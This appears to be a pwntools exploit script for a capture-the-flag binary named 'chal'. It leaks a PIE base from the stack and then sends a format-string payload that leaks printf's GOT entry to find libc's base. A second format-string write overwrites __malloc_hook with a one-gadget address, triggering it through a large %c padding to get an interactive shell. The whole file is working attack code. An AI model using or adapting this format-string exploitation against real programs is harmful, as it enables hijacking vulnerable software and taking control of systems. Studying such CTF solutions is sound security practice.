from pwn import *
from ctflib.pwn import *

e = ELF("./chal")
context.binary = e
def setup():
    return e.process()
    
p = setup()
# Pie [(18, -4704), (19, -4256), (22, -4704), (26, -4566), (30, -4256)]

pie_leak = read_stack(p, [18])[0]
e.address = pie_leak-4704
print(hex(e.address))

pl = b"AAAA%7$s"+p64(e.got.printf)
p.sendline(pl)
#gdb.attach(p)
d = p.clean()
i = d.index(b"\x7f")
leak = u64(d[i-5:i+1]+b"\0\0")
libc = ELF([x for x in p.libs().keys() if "libc" in x][0])
libc.address = leak - libc.sym.printf
#win = one_gadgets(libc)[0]
print(hex(libc.sym.__malloc_hook), hex(0xcb7a0+libc.address), hex(libc.address))
p.sendline(fmtstr_payload(6, {libc.sym.__malloc_hook: p64(0xcb7a0+libc.address)})+b"%100000c")
gdb.attach(p,"break *"+hex(0xcb7a0+libc.address))
p.interactive()